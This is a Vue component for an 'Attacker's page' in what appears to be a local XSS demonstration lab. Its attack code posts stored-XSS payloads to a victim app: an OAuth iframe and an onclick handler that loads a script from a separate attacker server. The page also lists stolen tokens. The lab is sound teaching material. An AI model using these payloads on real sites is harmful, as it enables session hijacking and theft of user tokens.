<template>
  <div class="dashboard">
    <h1>This is the Attacker's page</h1>
    <h2>XSS Attack Demos</h2>
    <h4>1. Unsuccessful Way - Iframe(GitHub)</h4>
    <input style="margin-right: 5px;" placeholder="Enter your username here ..." v-model="XSSInputOne" />
    <button type="button" @click="XSSOne()">
        <span>Submit</span>
    </button><br>
    <h4>2. The way to succeed under certain conditions - Induced Click(Twitter)</h4>
    <input style="margin-right: 5px;" placeholder="Enter your username here ..." v-model="XSSInputTwo" />
    <button type="button" @click="XSSTwo()">
        <span>Submit</span>
    </button>
    <h4>3. Stolen Token(s)</h4>
    <table>
        <tr>
          <th>Token</th>
          <th>Stolen Date</th>
        </tr>
        <tr v-for="(item, index) in stolenTokens" :key="index">
          <td>{{ item.usertoken }}</td>
          <td>{{ item.stolen_date }}</td>
        </tr>
      </table><br/>
  </div>
</template>

<script>
import { defineComponent, ref } from 'vue';
import axios from 'axios';

export default defineComponent({
  setup() {
    const XSSInputOne = ref('');
    const XSSInputTwo = ref('');
    const XSSPostForm = ref({
      username: '',
      post_title: '',
      post_content: '',
    })
    const stolenTokens = ref([]);

    const XSSOne = async () => {
      XSSPostForm.value.username = XSSInputOne.value;
      XSSPostForm.value.post_title = 'XSSOne POST';
      XSSPostForm.value.post_content = '<iframe src="https://github.com/login/oauth/authorize?client_id=d83ac1ef7822f3087e4b&redirect_uri=http://localhost:8080/login&scope=user"></iframe>';
      // We only indicate that iframe is impossible here
      try {
        if (XSSInputOne.value.length > 0 && XSSInputOne.value.includes('GitHub')) {
          const addPostRes = await axios.post('http://localhost:8000/dashboard/add_post', XSSPostForm.value);
          if (addPostRes.data.code == 200) {
            alert('XSS Succeeded');
          } else {
            alert('Unknown Error Occurred');
          }
        } else {
          alert('Please use a GitHub account');
        }
      } catch (error) {
        alert('Unknown Error Occurs');
      } finally {
        // Empty here
      }
    };

    const XSSTwo = async () => {
      XSSPostForm.value.username = XSSInputTwo.value;
      XSSPostForm.value.post_title = 'XSSTwo POST';
      XSSPostForm.value.post_content = "<h6 onclick=document.body.appendChild(document.createElement('script')).src='http://localhost:8001/static/xssattack.js'>Click Me Please!</h6>";
      // We only indicate that iframe is impossible here
      try {
        if (XSSInputTwo.value.length > 0 && XSSInputTwo.value.includes('Twitter')) {
          const addPostRes = await axios.post('http://localhost:8000/dashboard/add_post', XSSPostForm.value);
          if (addPostRes.data.code == 200) {
            alert('XSS Succeeded');
          } else {
            alert('Unknown Error Occurred');
          }
        } else {
          alert('Please use a Twitter account');
        }
      } catch (error) {
        alert('Unknown Error Occurs');
      } finally {
        // Empty here
      }
    };

    const getStolenTokens = async () => {
      try {
        const stolenTokensData = await axios.get('http://localhost:8001/dashboard/get_stolen_tokens');
        if (stolenTokensData.data.code == 200) {
          stolenTokens.value.splice(0, stolenTokens.value.length);
          stolenTokens.value = stolenTokens.value.concat(stolenTokensData.data.stolen_tokens);
        }
      } catch (error) {
        alert('Unknown Error Occurs');
      } finally {
        // Empty here
      }
    }

    getStolenTokens();

    return {
      XSSInputOne,
      XSSInputTwo,
      stolenTokens,
      XSSOne,
      XSSTwo,
    };
  },
});
</script>

<style>
table {
  width: 100%;
}

td, th {
  border: 1px solid #1b1b1b;
  text-align: left;
  padding: 8px;
}
</style>
